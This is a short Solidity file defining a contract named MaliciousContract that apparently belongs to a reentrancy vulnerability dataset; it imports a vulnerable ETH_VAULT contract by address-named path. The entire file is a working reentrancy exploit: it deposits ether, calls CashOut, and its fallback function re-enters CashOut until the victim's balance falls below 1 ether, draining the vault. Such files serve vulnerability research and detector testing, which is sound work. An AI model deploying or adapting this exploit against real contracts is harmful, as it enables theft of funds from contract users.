pragma solidity ^0.4.19;

import "../dataset/reentrancy/0xbaf51e761510c1a11bf48dd87c0307ac8a8c8a4f.sol";

contract MaliciousContract{
    ETH_VAULT eth_vault;
    

    constructor(address _victimAddress) public{
        eth_vault= ETH_VAULT (_victimAddress);
    }

   function attack(uint amount) public {
        require(amount >= 1 ether, "Must attempt and attack with at least 1 ether");
        eth_vault.CashOut(amount);
    }

    function deposit()  public payable{
        require(msg.value >= 1 ether, "Must add at least 1 ether");
        eth_vault.Deposit.value(msg.value)();        
    }

    function() payable public {
        // Re-enter the vulnerable function if there's still balance to collect
        if ( address(eth_vault).balance >= 1 ether) {
            eth_vault.CashOut(1 ether);
        }
    }
}
